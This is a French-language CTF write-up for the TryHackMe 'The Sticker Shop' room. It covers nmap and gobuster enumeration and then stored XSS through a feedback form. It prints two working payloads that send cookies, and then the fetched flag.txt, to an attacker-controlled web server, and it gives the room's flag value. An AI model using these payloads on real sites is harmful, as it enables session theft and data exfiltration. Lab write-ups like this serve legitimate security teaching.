---
date: 2024-12-04T16:26:19-06:00
# description: ""
image: "/images/THM-The_Sticker_Shop/Sticker_shop.png"
showTableOfContents: true
tags: ["TryHackMe"]
categories: ["Writeups"]
title: "THM: The Sticker Shop"
type: "post"
---

* Platforme: TryHackMe
* Lien: [The Sticker Shop](https://tryhackme.com/r/room/thestickershop)
* Niveau: Facile
---

Ce défi est assez simple. Après avoir confirmé la présence d'une vulnérabilité XSS, nous utilisons un payload modifié pour recevoir la valeur du fichier.

## Balayage

```
./nmap_scan.sh <IP_PROVIDED> The_Sticker_Shop
```

> Le script que j'utilise pour scanner les cibles est disponible [ici](https://github.com/K-Scorpio/scripts-collection/blob/main/nmap_scan.sh).

**Résultats**

```shell
Running detailed scan on open ports: 22,8080
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 16:38 CST
Nmap scan report for 10.10.139.96
Host is up (0.27s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 (RSA)
|   256 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 (ECDSA)
|_  256 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 (ED25519)
8080/tcp open  http-proxy Werkzeug/3.0.1 Python/3.8.10
|_http-server-header: Werkzeug/3.0.1 Python/3.8.10
|_http-title: Cat Sticker Shop
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.1 Python/3.8.10
|     Date: Wed, 04 Dec 2024 22:38:16 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1655
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>Cat Sticker Shop</title>
|     <style>
|     body {
|     font-family: Arial, sans-serif;
|     margin: 0;
|     padding: 0;
|     header {
|     background-color: #333;
|     color: #fff;
|     text-align: center;
|     padding: 10px;
|     header ul {
|     list-style: none;
|     padding: 0;
|     header li {
|     display: inline;
|     margin-right: 20px;
|     header a {
|     text-decoration: none;
|     color: #fff;
|     font-weight: bold;
|     .content {
|     padding: 20px;
|_    .product {
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=12/4%Time=6750D9D8%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,726,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.1\
SF:x20Python/3\.8\.10\r\nDate:\x20Wed,\x2004\x20Dec\x202024\x2022:38:16\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x201655\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<he
SF:ad>\n\x20\x20\x20\x20<title>Cat\x20Sticker\x20Shop</title>\n\x20\x20\x2
SF:0\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20Arial,\x20sans-serif;
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x200;\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20header\x20{\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#333;\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#fff;\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20header\x20ul
SF:\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20list-style:\x20n
SF:one;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x200;\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20heade
SF:r\x20li\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\
SF:x20inline;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-righ
SF:t:\x2020px;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20header\x20a\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20text-decoration:\x20none;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20font-weight:\x20bold;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\.content\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20padding:\x2020px;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\.product\x20{\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20bo");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.37 seconds
```

Notre scan nmap trouve deux ports ouverts 22 (SSH) et 8080 (http).

## Enumération

À `http://stickershop.thm:8080/`, nous découvrons un site de vente d'autocollants pour chats.

![The sticker shop website](/images/THM-The_Sticker_Shop/stickershop_website.png)

En cliquant sur `Feeback`, nous accédons à `http://stickershop.thm:8080/submit_feedback`, une section réservée aux commentaires des clients.

![The sticker shop feedback section](/images/THM-The_Sticker_Shop/stckershop_feedback.png)

Le code source de la page ne contient rien d'intéressant. Tenter de lire directement le drapeau à `http://10.10.139.96:8080/flag.txt` renvoie une erreur `401 Unauthorized`.

![flag read fail](/images/THM-The_Sticker_Shop/flag_401.png)

Avec gobuster, nous trouvons un répertoire `/view_feedback` auquel nous ne pouvons pas accéder.

![gobuster directory brute forcing](/images/THM-The_Sticker_Shop/gobuster_stickershop.png)

![stickershop view feedback](/images/THM-The_Sticker_Shop/stickershop_view_feedback.png)

### Exploitation XSS

L'indice nous indique que nous devons utiliser une exploitation côté client afin de lire le drapeau, nous allons donc essayer le Cross-Site Scripting (XSS). 

Commençons par un test, nous démarrons un serveur web sur notre machine locale et envoyons le payload à `http://stickershop.thm:8080/submit_feedback`.

```html
<script>document.location='http://WEBSERVER_IP/?cookie='+document.cookie;</script>
```

![XSS payload test](/images/THM-The_Sticker_Shop/XSS_payload_sent.png)

Après avoir soumis le payload, nous obtenons des réponses sur notre serveur web, confirmant la vulnérabilité XSS.

![XSS confirmation](/images/THM-The_Sticker_Shop/xss_confirm.png)

Nous savons que le drapeau se trouve à `http://10.10.139.96:8080/flag.txt`, nous pouvons donc modifier le payload afin de le recevoir sur notre serveur web.

```html
<script>
fetch('http://127.0.0.1:8080/flag.txt')
  .then(response => response.text())
  .then(data => {
    let img = new Image();
    img.src = 'http://WEBSER_IP:PORT/?data=' + encodeURIComponent(data);
    document.body.appendChild(img);
  });
</script>
```

![payload to receiver flag.txt](/images/THM-The_Sticker_Shop/flag_fetching.png)

![flag on webser](/images/THM-The_Sticker_Shop/flag_on_webserver.png)

Nous obtenons la valeur de `flag.txt` avec les accolades encodés. La valeur décodée est 

```
THM{83789a69074f636f64a38879cfcabe8b62305ee6}
```

Si vous voulez en savoir plus sur le Cross-Site Scripting, vous avez à votre disposition quelques salles sur TryHackMe:
* [Introduction to Cross-Site Scripting](https://tryhackme.com/r/room/xss)
* [XSS](https://tryhackme.com/r/room/axss)

Si vous avez besoin d'une liste de payloads pour le XSS, vous pouvez consulter le [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) de PortSwigger et ce [repo Github](https://github.com/djalilayed/tryhackme/blob/main/The%20Sticker%20Shop/payload.js).
